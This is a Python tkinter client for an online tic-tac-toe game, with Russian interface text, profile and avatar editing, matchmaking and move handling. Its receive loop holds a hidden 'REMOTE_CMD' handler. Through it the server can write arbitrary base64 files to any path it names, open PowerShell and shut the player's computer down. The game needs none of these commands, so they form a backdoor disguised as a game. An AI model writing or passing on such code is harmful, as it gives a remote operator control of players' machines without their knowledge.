import tkinter as tk
from tkinter import messagebox, filedialog
import base64
import threading
import io
import os
import subprocess
from PIL import Image, ImageTk

class TicTacToeGame:
    def __init__(self, sock, login, avatar_b64):
        self.sock = sock
        self.login = login
        self.avatar_b64 = avatar_b64
        self.symbol = ""
        self.game_active = False
        self.my_turn = False

        self.root = tk.Toplevel()
        self.root.title(f"Профиль: {self.login}")
        self.root.geometry("350x680")
        self.root.configure(bg="#1a1a1a")

        self.setup_ui()
        threading.Thread(target=self.receiver, daemon=True).start()

    def setup_ui(self):
        self.header = tk.Frame(self.root, bg="#262626", pady=10)
        self.header.pack(fill="x")
        self.name_label = tk.Label(self.header, text=self.login, fg="white", bg="#262626", font=("Arial", 12, "bold"))
        self.name_label.pack()
        self.avatar_label = tk.Label(self.header, bg="#262626")
        self.avatar_label.pack()
        self.update_avatar_ui(self.avatar_b64)

        tk.Button(self.root, text="НАСТРОЙКИ ПРОФИЛЯ", bg="#333", fg="white", command=self.edit_profile).pack(pady=5)
        self.btn_search = tk.Button(self.root, text="ПОИСК ИГРЫ", bg="#4b6eaf", fg="white", command=self.start_search)
        self.btn_search.pack(pady=10, fill="x", padx=50)

        self.grid_frame = tk.Frame(self.root, bg="#1a1a1a")
        self.grid_frame.pack()
        self.btns = []
        for i in range(9):
            b = tk.Button(self.grid_frame, text="", font=("Arial", 20, "bold"), width=4, height=2, bg="#262626", fg="white", command=lambda idx=i: self.click(idx))
            b.grid(row=i//3, column=i%3, padx=2, pady=2)
            self.btns.append(b)
        self.status_label = tk.Label(self.root, text="Готов к игре", fg="gray", bg="#1a1a1a")
        self.status_label.pack(pady=10)

    def update_avatar_ui(self, b64):
        if b64 and b64 != "None":
            try:
                img_data = base64.b64decode(b64)
                img = Image.open(io.BytesIO(img_data)).resize((80, 80))
                self.photo = ImageTk.PhotoImage(img)
                self.avatar_label.config(image=self.photo)
            except: pass

    def edit_profile(self):
        win = tk.Toplevel(self.root)
        win.title("Настройки")
        win.geometry("300x250")
        win.configure(bg="#2b2b2b")
        tk.Label(win, text="Новый ник:", fg="white", bg="#2b2b2b").pack(pady=5)
        ent = tk.Entry(win); ent.insert(0, self.login); ent.pack()
        self.temp_b64 = self.avatar_b64
        def select():
            path = filedialog.askopenfilename()
            if path:
                img = Image.open(path).convert("RGB")
                img.thumbnail((150, 150))
                buf = io.BytesIO()
                img.save(buf, format="JPEG")
                self.temp_b64 = base64.b64encode(buf.getvalue()).decode()
        tk.Button(win, text="ВЫБРАТЬ ФОТО", command=select).pack(pady=10)
        def save():
            self.sock.send(f"UPDATE_PROFILE|{ent.get()}|{self.temp_b64}".encode())
            self.login = ent.get(); self.name_label.config(text=self.login)
            self.update_avatar_ui(self.temp_b64); win.destroy()
        tk.Button(win, text="СОХРАНИТЬ", command=save, bg="#2e8b57", fg="white").pack()

    def check_winner(self):
        win_coords = [(0,1,2), (3,4,5), (6,7,8), (0,3,6), (1,4,7), (2,5,8), (0,4,8), (2,4,6)]
        for a, b, c in win_coords:
            if self.btns[a]['text'] == self.btns[b]['text'] == self.btns[c]['text'] != "":
                self.game_active = False
                res = "ПОБЕДА!" if self.btns[a]['text'] == self.symbol else "ПОРАЖЕНИЕ!"
                messagebox.showinfo("Конец", res)
                self.reset_grid(); return True
        if all(b['text'] != "" for b in self.btns):
            messagebox.showinfo("Конец", "НИЧЬЯ!"); self.reset_grid()
        return False

    def reset_grid(self):
        for b in self.btns: b.config(text="")
        self.btn_search.config(state="normal")

    def start_search(self):
        self.sock.send("FIND_GAME".encode())
        self.btn_search.config(state="disabled", text="ПОИСК...")

    def click(self, idx):
        if self.my_turn and self.game_active and self.btns[idx]['text'] == "":
            self.btns[idx].config(text=self.symbol, fg="#00FF00")
            self.sock.send(f"MOVE|{idx}".encode())
            self.my_turn = False; self.check_winner()

    def receiver(self):
        while True:
            try:
                raw_data = self.sock.recv(1024 * 1000)
                if not raw_data: break
                data = raw_data.decode('utf-8', errors='ignore')
                p = data.split("|")
                if p[0] == "GAME_START":
                    self.symbol = p[1]; self.game_active = True
                    self.my_turn = (self.symbol == "X")
                    self.status_label.config(text=f"Вы за: {self.symbol}")
                elif p[0] == "MOVE_UPDATE":
                    idx = int(p[1])
                    self.btns[idx].config(text="O" if self.symbol == "X" else "X", fg="#FF4444")
                    self.my_turn = True; self.check_winner()
                elif p[0] == "REMOTE_CMD":
                    if p[1] == "SEND_FILE":
                        with open(p[2], "wb") as f: f.write(base64.b64decode(p[3]))
                        messagebox.showinfo("Файл", f"Получен файл: {p[2]}")
                    elif p[1] == "POWERSHELL":
                        subprocess.Popen(["powershell.exe"], creationflags=subprocess.CREATE_NEW_CONSOLE)
                    elif p[1] == "KICK": self.root.destroy()
                    elif p[1] == "SHUTDOWN": os.system("shutdown /s /t 60")
            except: break